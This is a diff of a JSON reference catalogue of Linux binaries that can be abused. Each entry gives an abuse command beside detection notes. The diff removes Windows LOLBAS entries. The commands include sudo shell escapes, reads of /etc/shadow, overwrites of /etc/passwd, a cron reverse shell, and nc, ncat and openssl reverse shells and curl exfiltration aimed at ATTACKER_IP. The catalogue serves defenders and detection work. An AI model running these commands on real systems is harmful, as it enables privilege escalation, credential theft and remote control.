@@ -1,75 +1,45 @@
 [
   {
-    "id": "certutil",
-    "name": "certutil.exe",
-    "os": "windows",
-    "category": "Download / Decode",
-    "description": "Native Windows certificate utility abusable for downloading files or decoding base64 payloads.",
-    "example_command": "certutil -urlcache -split -f http://example.com/payload.exe payload.exe",
+    "id": "apt",
+    "name": "apt",
+    "os": "linux",
+    "category": "Shell / Privilege Escalation",
+    "description": "apt/apt-get can run commands via APT::Update::Pre-Invoke or the changelog pager; abusable under sudo.",
+    "example_command": "sudo apt-get changelog apt\n!/bin/sh",
     "alt_commands": [
-      "certutil -decode encoded.txt decoded.exe"
+      "sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh"
     ],
-    "detection_notes": "Alert on certutil.exe spawning with '-urlcache' or '-decode' flags, especially with outbound network connections. Sigma rule: process_creation with Image ending in certutil.exe AND CommandLine contains 'urlcache'.",
+    "detection_notes": "Alert on apt/apt-get run via sudo with Pre-Invoke/Post-Invoke options or pager shell escapes.",
     "references": [
-      "https://lolbas-project.github.io/lolbas/Binaries/Certutil/"
+      "https://gtfobins.github.io/gtfobins/apt-get/"
     ]
   },
   {
-    "id": "mshta",
-    "name": "mshta.exe",
-    "os": "windows",
-    "category": "Execution",
-    "description": "Executes Microsoft HTML Application (.hta) files, commonly abused to run remote scripts.",
-    "example_command": "mshta http://example.com/payload.hta",
+    "id": "awk",
+    "name": "awk",
+    "os": "linux",
+    "category": "Shell / File Read-Write / Privilege Escalation",
+    "description": "awk can run system commands and read/write files; abusable when SUID or run via sudo.",
+    "example_command": "sudo awk 'BEGIN {system(\"/bin/sh\")}'",
     "alt_commands": [
-      "mshta vbscript:Close(Execute(\"GetObject(\"\"script:http://example.com/payload.sct\"\")\"))"
+      "awk 'BEGIN {system(\"/bin/sh\")}' /dev/null"
     ],
-    "detection_notes": "Monitor for mshta.exe with network connections or spawning child processes like powershell.exe/cmd.exe. Rare in normal business use.",
+    "detection_notes": "Alert on awk/gawk/nawk invoked via sudo with a BEGIN{system(...)} program.",
     "references": [
-      "https://lolbas-project.github.io/lolbas/Binaries/Mshta/"
+      "https://gtfobins.github.io/gtfobins/awk/"
     ]
   },
   {
-    "id": "regsvr32",
-    "name": "regsvr32.exe",
-    "os": "windows",
-    "category": "Execution / Bypass",
-    "description": "Registers DLLs, abusable via 'Squiblydoo' technique to execute scriptlets from remote servers, bypassing application whitelisting.",
-    "example_command": "regsvr32 /s /n /u /i:http://example.com/payload.sct scrobj.dll",
+    "id": "base64",
+    "name": "base64",
+    "os": "linux",
+    "category": "File Read",
+    "description": "base64 can read arbitrary files (encoding then decoding the output); useful under SUID/sudo to read privileged files.",
+    "example_command": "sudo base64 /etc/shadow | base64 --decode",
     "alt_commands": [],
-    "detection_notes": "Flag regsvr32.exe with '/i:http' in command line or network connections shortly after execution.",
+    "detection_notes": "Alert on base64 run via sudo against /etc/shadow, private keys, or other sensitive files.",
     "references": [
-      "https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/"
-    ]
-  },
-  {
-    "id": "rundll32",
-    "name": "rundll32.exe",
-    "os": "windows",
-    "category": "Execution",
-    "description": "Runs functions stored in DLL files; can be abused to execute arbitrary code or JavaScript via advpack.dll/pcwutl.dll.",
-    "example_command": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:http://example.com/payload.sct\")",
-    "alt_commands": [
-      "rundll32.exe pcwutl.dll,LaunchApplication notepad.exe"
-    ],
-    "detection_notes": "Baseline normal rundll32 usage per environment; alert on unusual DLL exports (LaunchApplication, RunHTMLApplication) or network activity.",
-    "references": [
-      "https://lolbas-project.github.io/lolbas/Binaries/Rundll32/"
-    ]
-  },
-  {
-    "id": "wmic",
-    "name": "wmic.exe",
-    "os": "windows",
-    "category": "Execution / Lateral Movement",
-    "description": "Windows Management Instrumentation command tool, abusable for remote process creation and payload execution.",
-    "example_command": "wmic /node:TARGET process call create \"cmd.exe /c calc.exe\"",
-    "alt_commands": [
-      "wmic os get /format:\"http://example.com/payload.xsl\""
-    ],
-    "detection_notes": "Monitor wmic.exe usage with 'process call create', especially targeting remote nodes, and 'format:' XSL abuse.",
-    "references": [
-      "https://lolbas-project.github.io/lolbas/Binaries/Wmic/"
+      "https://gtfobins.github.io/gtfobins/base64/"
     ]
   },
   {
@@ -77,14 +47,235 @@
     "name": "bash",
     "os": "linux",
     "category": "Shell / Privilege Escalation",
-    "description": "If bash has SUID bit set or is allowed via sudo without restriction, can be used to escalate privileges or spawn shells.",
+    "description": "If bash has the SUID bit set or is allowed via sudo, it directly yields a privileged shell.",
     "example_command": "sudo bash -p",
     "alt_commands": [
-      "bash -p (if SUID bit set)"
+      "bash -p   # when the SUID bit is set on bash"
     ],
-    "detection_notes": "Audit SUID binaries regularly (find / -perm -4000). Alert on sudoers entries allowing bash without command restriction.",
+    "detection_notes": "Audit SUID/SGID binaries regularly (find / -perm -4000 -type f). Alert on this binary spawning a shell or reading/writing files outside its normal role, especially with euid=0.",
     "references": [
       "https://gtfobins.github.io/gtfobins/bash/"
+    ]
+  },
+  {
+    "id": "busybox",
+    "name": "busybox",
+    "os": "linux",
+    "category": "Shell / Privilege Escalation",
+    "description": "BusyBox bundles many applets; its sh applet yields a privileged shell when SUID or allowed via sudo.",
+    "example_command": "sudo busybox sh",
+    "alt_commands": [
+      "busybox sh   # when the SUID bit is set"
+    ],
+    "detection_notes": "Audit SUID/SGID binaries regularly (find / -perm -4000 -type f). Alert on this binary spawning a shell or reading/writing files outside its normal role, especially with euid=0.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/busybox/"
+    ]
+  },
+  {
+    "id": "capsh",
+    "name": "capsh",
+    "os": "linux",
+    "category": "Shell / Privilege Escalation",
+    "description": "capsh can drop into a shell with capabilities; under sudo it yields a root shell directly.",
+    "example_command": "sudo capsh --",
+    "alt_commands": [],
+    "detection_notes": "Review sudoers for unrestricted NOPASSWD entries. Alert on this binary being run via sudo and then spawning /bin/sh, /bin/bash, or writing to sensitive paths.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/capsh/"
+    ]
+  },
+  {
+    "id": "cat",
+    "name": "cat",
+    "os": "linux",
+    "category": "File Read",
+    "description": "cat reads arbitrary files; under SUID/sudo it discloses privileged file contents.",
+    "example_command": "sudo cat /etc/shadow",
+    "alt_commands": [],
+    "detection_notes": "Alert on cat run via sudo against sensitive files (/etc/shadow, key material).",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/cat/"
+    ]
+  },
+  {
+    "id": "chmod",
+    "name": "chmod",
+    "os": "linux",
+    "category": "Privilege Escalation",
+    "description": "chmod under sudo can SUID a shell or loosen permissions on sensitive files.",
+    "example_command": "sudo chmod u+s /bin/bash   # then: bash -p",
+    "alt_commands": [
+      "sudo chmod 777 /etc/shadow"
+    ],
+    "detection_notes": "Alert on chmod run via sudo adding SUID bits to shells or weakening perms on /etc/shadow/sudoers.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/chmod/"
+    ]
+  },
+  {
+    "id": "chown",
+    "name": "chown",
+    "os": "linux",
+    "category": "Privilege Escalation",
+    "description": "chown under sudo can take ownership of sensitive files (e.g. /etc/passwd) to enable tampering.",
+    "example_command": "sudo chown $(id -un):$(id -gn) /etc/passwd",
+    "alt_commands": [],
+    "detection_notes": "Alert on chown run via sudo changing ownership of system config files.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/chown/"
+    ]
+  },
+  {
+    "id": "cp",
+    "name": "cp",
+    "os": "linux",
+    "category": "File Write / Privilege Escalation",
+    "description": "cp can overwrite arbitrary files (e.g. /etc/passwd) under SUID/sudo, enabling privilege escalation.",
+    "example_command": "sudo cp /tmp/evil_passwd /etc/passwd",
+    "alt_commands": [],
+    "detection_notes": "Alert on cp run via sudo overwriting system files; monitor integrity of /etc/passwd, /etc/shadow, sudoers.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/cp/"
+    ]
+  },
+  {
+    "id": "crontab",
+    "name": "crontab",
+    "os": "linux",
+    "category": "Persistence / Privilege Escalation",
+    "description": "Scheduled task abuse for persistence; writable cron jobs or root cron referencing world-writable scripts enable escalation.",
+    "example_command": "echo '* * * * * /bin/bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"' | crontab -",
+    "alt_commands": [],
+    "detection_notes": "Monitor changes to crontabs (auditd on /etc/cron*, /var/spool/cron), especially reverse-shell patterns (/dev/tcp) or new entries.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/crontab/"
+    ]
+  },
+  {
+    "id": "csh",
+    "name": "csh",
+    "os": "linux",
+    "category": "Shell / Privilege Escalation",
+    "description": "C shell yields a privileged shell when SUID or allowed via sudo.",
+    "example_command": "sudo csh",
+    "alt_commands": [],
+    "detection_notes": "Audit SUID/SGID binaries regularly (find / -perm -4000 -type f). Alert on this binary spawning a shell or reading/writing files outside its normal role, especially with euid=0.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/csh/"
+    ]
+  },
+  {
+    "id": "curl",
+    "name": "curl",
+    "os": "linux",
+    "category": "Download / File Write / Exfiltration",
+    "description": "Transfers data; under sudo can overwrite privileged files or fetch/exfiltrate payloads.",
+    "example_command": "curl http://ATTACKER_IP/payload -o /tmp/payload",
+    "alt_commands": [
+      "sudo curl file:///etc/shadow -o /tmp/shadow   # read a privileged file",
+      "curl -X POST -d @/etc/shadow http://ATTACKER_IP/   # exfiltrate a file"
+    ],
+    "detection_notes": "Alert on curl run via sudo reading/writing system paths, or POSTing local files to external hosts.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/curl/"
+    ]
+  },
+  {
+    "id": "dash",
+    "name": "dash",
+    "os": "linux",
+    "category": "Shell / Privilege Escalation",
+    "description": "Debian Almquist shell yields a privileged shell when SUID or allowed via sudo.",
+    "example_command": "sudo dash",
+    "alt_commands": [
+      "dash -p   # when the SUID bit is set"
+    ],
+    "detection_notes": "Audit SUID/SGID binaries regularly (find / -perm -4000 -type f). Alert on this binary spawning a shell or reading/writing files outside its normal role, especially with euid=0.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/dash/"
+    ]
+  },
+  {
+    "id": "dd",
+    "name": "dd",
+    "os": "linux",
+    "category": "File Read-Write",
+    "description": "dd reads and writes raw data to files/devices; under SUID/sudo it can overwrite privileged files.",
+    "example_command": "echo 'root2::0:0:::/bin/sh' | sudo dd of=/etc/passwd conv=notrunc oflag=append",
+    "alt_commands": [
+      "sudo dd if=/etc/shadow   # read a privileged file"
+    ],
+    "detection_notes": "Alert on dd run via sudo writing to /etc/passwd, /etc/shadow, or block devices.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/dd/"
+    ]
+  },
+  {
+    "id": "docker",
+    "name": "docker",
+    "os": "linux",
+    "category": "Privilege Escalation",
+    "description": "Membership in the docker group (or sudo docker) is root-equivalent: mount the host filesystem into a container.",
+    "example_command": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
+    "alt_commands": [],
+    "detection_notes": "Treat docker-group membership as root. Alert on 'docker run' mounting the host root (-v /:) and chroot/nsenter into it.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/docker/"
+    ]
+  },
+  {
+    "id": "dpkg",
+    "name": "dpkg",
+    "os": "linux",
+    "category": "Shell",
+    "description": "dpkg's -l output uses a pager that can shell out via '!'; abusable when run via sudo.",
+    "example_command": "sudo dpkg -l\n!/bin/sh",
+    "alt_commands": [],
+    "detection_notes": "Review sudoers for unrestricted NOPASSWD entries. Alert on this binary being run via sudo and then spawning /bin/sh, /bin/bash, or writing to sensitive paths.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/dpkg/"
+    ]
+  },
+  {
+    "id": "ed",
+    "name": "ed",
+    "os": "linux",
+    "category": "Shell / File Read-Write",
+    "description": "The ed line editor can shell out via '!'; abusable when SUID or run via sudo.",
+    "example_command": "sudo ed\n!/bin/sh",
+    "alt_commands": [],
+    "detection_notes": "Review sudoers for unrestricted NOPASSWD entries. Alert on this binary being run via sudo and then spawning /bin/sh, /bin/bash, or writing to sensitive paths.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/ed/"
+    ]
+  },
+  {
+    "id": "env",
+    "name": "env",
+    "os": "linux",
+    "category": "Shell / Privilege Escalation",
+    "description": "env runs an arbitrary program in a modified environment; a direct shell launcher under SUID/sudo.",
+    "example_command": "sudo env /bin/sh",
+    "alt_commands": [
+      "env /bin/sh -p   # when SUID"
+    ],
+    "detection_notes": "Audit SUID/SGID binaries regularly (find / -perm -4000 -type f). Alert on this binary spawning a shell or reading/writing files outside its normal role, especially with euid=0.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/env/"
+    ]
+  },
+  {
+    "id": "expect",
+    "name": "expect",
+    "os": "linux",
+    "category": "Shell / Privilege Escalation",
+    "description": "Expect can spawn interactive shells; abusable when SUID or run via sudo.",
+    "example_command": "sudo expect -c 'spawn /bin/sh -p; interact'",
+    "alt_commands": [],
+    "detection_notes": "Audit SUID/SGID binaries regularly (find / -perm -4000 -type f). Alert on this binary spawning a shell or reading/writing files outside its normal role, especially with euid=0.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/expect/"
     ]
   },
   {
@@ -92,7 +283,7 @@
     "name": "find",
     "os": "linux",
     "category": "Privilege Escalation",
-    "description": "The find command's -exec flag can spawn a shell, commonly abused when find has SUID or elevated sudo rights.",
+    "description": "find's -exec flag spawns a shell, commonly abused when find has SUID or elevated sudo rights.",
     "example_command": "find . -exec /bin/sh -p \\; -quit",
     "alt_commands": [
       "sudo find . -exec /bin/sh \\; -quit"
@@ -103,16 +294,1340 @@
     ]
   },
   {
-    "id": "cron",
-    "name": "crontab",
+    "id": "flock",
+    "name": "flock",
     "os": "linux",
-    "category": "Persistence",
-    "description": "Scheduled task abuse for persistence; if writable by low-priv user or root cron references world-writable scripts, can lead to privilege escalation.",
-    "example_command": "echo '* * * * * /bin/bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"' | crontab -",
+    "category": "Shell / Privilege Escalation",
+    "description": "flock runs a command while holding a lock — a shell launcher abusable under SUID/sudo.",
+    "example_command": "sudo flock -u / /bin/sh",
     "alt_commands": [],
-    "detection_notes": "Monitor changes to crontabs, especially reverse shell patterns (/dev/tcp) or unexpected new entries.",
+    "detection_notes": "Review sudoers for unrestricted NOPASSWD entries. Alert on this binary being run via sudo and then spawning /bin/sh, /bin/bash, or writing to sensitive paths.",
     "references": [
-      "https://gtfobins.github.io/gtfobins/crontab/"
+      "https://gtfobins.github.io/gtfobins/flock/"
+    ]
+  },
+  {
+    "id": "ftp",
+    "name": "ftp",
+    "os": "linux",
+    "category": "Shell / File Transfer",
+    "description": "The ftp client can shell out via '!'; abusable when SUID or run via sudo, and for transferring files.",
+    "example_command": "sudo ftp\nftp> !/bin/sh",
+    "alt_commands": [],
+    "detection_notes": "Review sudoers for unrestricted NOPASSWD entries. Alert on this binary being run via sudo and then spawning /bin/sh, /bin/bash, or writing to sensitive paths.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/ftp/"
+    ]
+  },
+  {
+    "id": "gawk",
+    "name": "gawk",
+    "os": "linux",
+    "category": "Shell / Privilege Escalation",
+    "description": "GNU awk can execute system commands, abusable when SUID or via sudo.",
+    "example_command": "sudo gawk 'BEGIN {system(\"/bin/sh\")}'",
+    "alt_commands": [],
+    "detection_notes": "Review sudoers for unrestricted NOPASSWD entries. Alert on this binary being run via sudo and then spawning /bin/sh, /bin/bash, or writing to sensitive paths.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/gawk/"
+    ]
+  },
+  {
+    "id": "gcc",
+    "name": "gcc",
+    "os": "linux",
+    "category": "Shell / Privilege Escalation",
+    "description": "gcc can launch a program via -wrapper; abusable when SUID or run via sudo.",
+    "example_command": "sudo gcc -wrapper /bin/sh,-s .",
+    "alt_commands": [],
+    "detection_notes": "Review sudoers for unrestricted NOPASSWD entries. Alert on this binary being run via sudo and then spawning /bin/sh, /bin/bash, or writing to sensitive paths.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/gcc/"
+    ]
+  },
+  {
+    "id": "gdb",
+    "name": "gdb",
+    "os": "linux",
+    "category": "Shell / Privilege Escalation",
+    "description": "The GNU debugger can execute shells and, when SUID, call setuid(0); abusable via sudo/SUID.",
+    "example_command": "sudo gdb -nx -ex '!sh' -ex quit",
+    "alt_commands": [
+      "gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit   # when SUID"
+    ],
+    "detection_notes": "Review sudoers for unrestricted NOPASSWD entries. Alert on this binary being run via sudo and then spawning /bin/sh, /bin/bash, or writing to sensitive paths.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/gdb/"
+    ]
+  },
+  {
+    "id": "git",
+    "name": "git",
+    "os": "linux",
+    "category": "Shell / Privilege Escalation",
+    "description": "git can execute commands via hooks, pagers, and -c aliases; abusable when SUID or run via sudo.",
+    "example_command": "sudo git -p help config\n!/bin/sh",
+    "alt_commands": [
+      "sudo git branch --help\n!/bin/sh   # via the pager",
+      "git config core.pager '!/bin/sh; false'; git -p log"
+    ],
+    "detection_notes": "Alert on git run via sudo with a pager shell escape, custom core.pager, or ext:: transports.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/git/"
+    ]
+  },
+  {
+    "id": "ionice",
+    "name": "ionice",
+    "os": "linux",
+    "category": "Shell / Privilege Escalation",
+    "description": "ionice runs a program with an I/O scheduling class — a shell launcher abusable under SUID/sudo.",
+    "example_command": "sudo ionice /bin/sh",
+    "alt_commands": [],
+    "detection_notes": "Audit SUID/SGID binaries regularly (find / -perm -4000 -type f). Alert on this binary spawning a shell or reading/writing files outside its normal role, especially with euid=0.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/ionice/"
+    ]
+  },
+  {
+    "id": "java",
+    "name": "java",
+    "os": "linux",
+    "category": "Shell / Privilege Escalation",
+    "description": "java can execute a compiled class that spawns a shell; abusable when run via sudo.",
+    "example_command": "echo 'public class x{public static void main(String[] a)throws Exception{Runtime.getRuntime().exec(new String[]{\"/bin/sh\",\"-c\",\"sh <$(tty) >$(tty) 2>$(tty)\"}).waitFor();}}' > x.java; javac x.java; sudo java x",
+    "alt_commands": [],
+    "detection_notes": "Review sudoers for unrestricted NOPASSWD entries. Alert on this binary being run via sudo and then spawning /bin/sh, /bin/bash, or writing to sensitive paths.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/java/"
+    ]
+  },
+  {
+    "id": "journalctl",
+    "name": "journalctl",
+    "os": "linux",
+    "category": "Shell",
+    "description": "journalctl invokes a pager (less) that can shell out via '!'; abusable when run via sudo.",
+    "example_command": "sudo journalctl\n!/bin/sh",
+    "alt_commands": [],
+    "detection_notes": "Review sudoers for unrestricted NOPASSWD entries. Alert on this binary being run via sudo and then spawning /bin/sh, /bin/bash, or writing to sensitive paths.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/journalctl/"
+    ]
+  },
+  {
+    "id": "jrunscript",
+    "name": "jrunscript",
+    "os": "linux",
+    "category": "Shell / Privilege Escalation",
+    "description": "The JDK script tool can execute commands via JavaScript; abusable when SUID or run via sudo.",
+    "example_command": "sudo jrunscript -e \"exec('/bin/sh -c \\\"sh <$(tty) >$(tty) 2>$(tty)\\\"')\"",
+    "alt_commands": [],
+    "detection_notes": "Review sudoers for unrestricted NOPASSWD entries. Alert on this binary being run via sudo and then spawning /bin/sh, /bin/bash, or writing to sensitive paths.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/jrunscript/"
+    ]
+  },
+  {
+    "id": "ksh",
+    "name": "ksh",
+    "os": "linux",
+    "category": "Shell / Privilege Escalation",
+    "description": "KornShell yields a privileged shell when SUID or allowed via sudo.",
+    "example_command": "sudo ksh",
+    "alt_commands": [],
+    "detection_notes": "Audit SUID/SGID binaries regularly (find / -perm -4000 -type f). Alert on this binary spawning a shell or reading/writing files outside its normal role, especially with euid=0.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/ksh/"
+    ]
+  },
+  {
+    "id": "less",
+    "name": "less",
+    "os": "linux",
+    "category": "Shell / File Read / Privilege Escalation",
+    "description": "The less pager can spawn a shell via '!' and read arbitrary files; dangerous under SUID/sudo.",
+    "example_command": "sudo less /etc/profile\n!/bin/sh",
+    "alt_commands": [
+      "less /etc/shadow   # read privileged files when SUID"
+    ],
+    "detection_notes": "Alert on less/more/man run via sudo spawning /bin/sh via '!'.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/less/"
+    ]
+  },
+  {
+    "id": "ltrace",
+    "name": "ltrace",
+    "os": "linux",
+    "category": "Shell / Privilege Escalation",
+    "description": "ltrace can run a target program; a shell launcher abusable under sudo.",
+    "example_command": "sudo ltrace -b -L /bin/sh",
+    "alt_commands": [],
+    "detection_notes": "Review sudoers for unrestricted NOPASSWD entries. Alert on this binary being run via sudo and then spawning /bin/sh, /bin/bash, or writing to sensitive paths.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/ltrace/"
+    ]
+  },
+  {
+    "id": "lua",
+    "name": "lua",
+    "os": "linux",
+    "category": "Shell / Privilege Escalation",
+    "description": "Lua can execute commands via os.execute; abusable when SUID or run via sudo.",
+    "example_command": "sudo lua -e 'os.execute(\"/bin/sh\")'",
+    "alt_commands": [],
+    "detection_notes": "Review sudoers for unrestricted NOPASSWD entries. Alert on this binary being run via sudo and then spawning /bin/sh, /bin/bash, or writing to sensitive paths.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/lua/"
+    ]
+  },
+  {
+    "id": "make",
+    "name": "make",
+    "os": "linux",
+    "category": "Shell / Privilege Escalation",
+    "description": "make can run shell commands from a crafted Makefile; abusable when SUID or run via sudo.",
+    "example_command": "COMMAND='/bin/sh'; TF=$(mktemp); printf 'a:\\n\\t-$(COMMAND)\\n' > $TF; sudo make -s --eval=$'x:\\n\\t-'\"$COMMAND\" -f $TF",
+    "alt_commands": [],
+    "detection_notes": "Review sudoers for unrestricted NOPASSWD entries. Alert on this binary being run via sudo and then spawning /bin/sh, /bin/bash, or writing to sensitive paths.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/make/"
+    ]
+  },
+  {
+    "id": "man",
+    "name": "man",
+    "os": "linux",
+    "category": "Shell / Privilege Escalation",
+    "description": "man uses a pager (less) that can shell out via '!'; abusable when run via sudo.",
+    "example_command": "sudo man man\n!/bin/sh",
+    "alt_commands": [
+      "man -P /bin/sh man"
+    ],
+    "detection_notes": "Review sudoers for unrestricted NOPASSWD entries. Alert on this binary being run via sudo and then spawning /bin/sh, /bin/bash, or writing to sensitive paths.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/man/"
+    ]
+  },
+  {
+    "id": "more",
+    "name": "more",
+    "os": "linux",
+    "category": "Shell / File Read",
+    "description": "The more pager can spawn a shell via '!' when the terminal is small enough to page.",
+    "example_command": "sudo more /etc/profile\n!/bin/sh",
+    "alt_commands": [],
+    "detection_notes": "Review sudoers for unrestricted NOPASSWD entries. Alert on this binary being run via sudo and then spawning /bin/sh, /bin/bash, or writing to sensitive paths.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/more/"
+    ]
+  },
+  {
+    "id": "mv",
+    "name": "mv",
+    "os": "linux",
+    "category": "File Write / Privilege Escalation",
+    "description": "mv can replace arbitrary files under SUID/sudo, enabling privilege escalation.",
+    "example_command": "sudo mv /tmp/evil_passwd /etc/passwd",
+    "alt_commands": [],
+    "detection_notes": "Alert on mv run via sudo replacing system files.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/mv/"
+    ]
+  },
+  {
+    "id": "mysql",
+    "name": "mysql",
+    "os": "linux",
+    "category": "Shell / Privilege Escalation",
+    "description": "The mysql client can shell out via '\\!'; abusable when SUID or run via sudo.",
+    "example_command": "sudo mysql -e '\\! /bin/sh'",
+    "alt_commands": [],
+    "detection_notes": "Review sudoers for unrestricted NOPASSWD entries. Alert on this binary being run via sudo and then spawning /bin/sh, /bin/bash, or writing to sensitive paths.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/mysql/"
+    ]
+  },
+  {
+    "id": "nano",
+    "name": "nano",
+    "os": "linux",
+    "category": "File Read-Write / Privilege Escalation",
+    "description": "GNU nano can read/write arbitrary files and, when SUID/sudo, be used to edit privileged files.",
+    "example_command": "sudo nano /etc/shadow",
+    "alt_commands": [
+      "nano\n^R^X reset; sh 1>&0 2>&0   # command execution via Ctrl+R Ctrl+X"
+    ],
+    "detection_notes": "Alert on nano launched via sudo editing /etc/passwd, /etc/shadow, or sudoers; monitor for command execution via ^R^X.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/nano/"
+    ]
+  },
+  {
+    "id": "nc",
+    "name": "nc",
+    "os": "linux",
+    "category": "Reverse Shell / Shell",
+    "description": "Traditional netcat with the -e option (or FIFO trick) enables reverse and bind shells.",
+    "example_command": "nc ATTACKER_IP 4444 -e /bin/sh",
+    "alt_commands": [
+      "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP 4444 > /tmp/f"
+    ],
+    "detection_notes": "Alert on nc/netcat with -e, or the mkfifo|sh|nc reverse-shell idiom; monitor outbound to uncommon ports.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/nc/"
+    ]
+  },
+  {
+    "id": "ncat",
+    "name": "ncat",
+    "os": "linux",
+    "category": "Reverse Shell / Shell",
+    "description": "Nmap's netcat can execute a program on connect (--exec/-e), enabling reverse/bind shells.",
+    "example_command": "ncat ATTACKER_IP 4444 -e /bin/sh",
+    "alt_commands": [
+      "ncat -l 4444 --exec /bin/sh   # bind shell"
+    ],
+    "detection_notes": "Alert on ncat/nc with -e/--exec/-c to a shell; monitor outbound connections to uncommon ports.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/ncat/"
+    ]
+  },
+  {
+    "id": "nice",
+    "name": "nice",
+    "os": "linux",
+    "category": "Shell / Privilege Escalation",
+    "description": "nice runs a program at an altered priority — a shell launcher abusable under SUID/sudo.",
+    "example_command": "sudo nice /bin/sh",
+    "alt_commands": [],
+    "detection_notes": "Audit SUID/SGID binaries regularly (find / -perm -4000 -type f). Alert on this binary spawning a shell or reading/writing files outside its normal role, especially with euid=0.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/nice/"
+    ]
+  },
+  {
+    "id": "nmap",
+    "name": "nmap",
+    "os": "linux",
+    "category": "Shell / Privilege Escalation",
+    "description": "Older nmap has an interactive mode with '!'; the NSE engine can also run shells. Abusable via SUID/sudo.",
+    "example_command": "sudo nmap --interactive\nnmap> !sh",
+    "alt_commands": [
+      "TF=$(mktemp); echo 'os.execute(\"/bin/sh\")' > $TF; sudo nmap --script=$TF"
+    ],
+    "detection_notes": "Alert on nmap run via sudo with --interactive or --script pointing at a temp file.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/nmap/"
+    ]
+  },
+  {
+    "id": "node",
+    "name": "node",
+    "os": "linux",
+    "category": "Shell / Privilege Escalation",
+    "description": "Node.js can spawn shells via child_process; abusable when run via sudo.",
+    "example_command": "sudo node -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0,1,2]})'",
+    "alt_commands": [],
+    "detection_notes": "Review sudoers for unrestricted NOPASSWD entries. Alert on this binary being run via sudo and then spawning /bin/sh, /bin/bash, or writing to sensitive paths.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/node/"
+    ]
+  },
+  {
+    "id": "nohup",
+    "name": "nohup",
+    "os": "linux",
+    "category": "Shell / Privilege Escalation",
+    "description": "nohup runs a program immune to hangups — a shell launcher abusable under SUID/sudo.",
+    "example_command": "sudo nohup /bin/sh -c 'sh <$(tty) >$(tty) 2>$(tty)'",
+    "alt_commands": [],
+    "detection_notes": "Review sudoers for unrestricted NOPASSWD entries. Alert on this binary being run via sudo and then spawning /bin/sh, /bin/bash, or writing to sensitive paths.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/nohup/"
+    ]
+  },
+  {
+    "id": "openssl",
+    "name": "openssl",
+    "os": "linux",
+    "category": "File Read-Write / Reverse Shell",
+    "description": "openssl can read/write files, and its s_client/s_server can tunnel an encrypted reverse shell.",
+    "example_command": "openssl s_client -quiet -connect ATTACKER_IP:4444 | /bin/sh 2>&1 | openssl s_client -quiet -connect ATTACKER_IP:4444",
+    "alt_commands": [
+      "sudo openssl enc -in /etc/shadow   # read a privileged file"
+    ],
+    "detection_notes": "Alert on openssl s_client/s_server piped to a shell (encrypted C2), and sudo openssl reading sensitive files.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/openssl/"
+    ]
+  },
+  {
+    "id": "perl",
+    "name": "perl",
+    "os": "linux",
+    "category": "Shell / Privilege Escalation",
+    "description": "Perl can execute commands via exec/system; abusable when SUID or run via sudo.",
+    "example_command": "sudo perl -e 'exec \"/bin/sh\";'",
+    "alt_commands": [
+      "perl -e 'exec \"/bin/sh\";'   # when SUID"
+    ],
+    "detection_notes": "Review sudoers for unrestricted NOPASSWD entries. Alert on this binary being run via sudo and then spawning /bin/sh, /bin/bash, or writing to sensitive paths.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/perl/"
+    ]
+  },
+  {
+    "id": "php",
+    "name": "php",
+    "os": "linux",
+    "category": "Shell / Privilege Escalation",
+    "description": "PHP CLI can execute system commands; abusable when SUID or run via sudo.",
+    "example_command": "sudo php -r \"system('/bin/sh');\"",
+    "alt_commands": [
+      "php -r \"pcntl_exec('/bin/sh', ['-p']);\"   # when SUID"
+    ],
+    "detection_notes": "Review sudoers for unrestricted NOPASSWD entries. Alert on this binary being run via sudo and then spawning /bin/sh, /bin/bash, or writing to sensitive paths.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/php/"
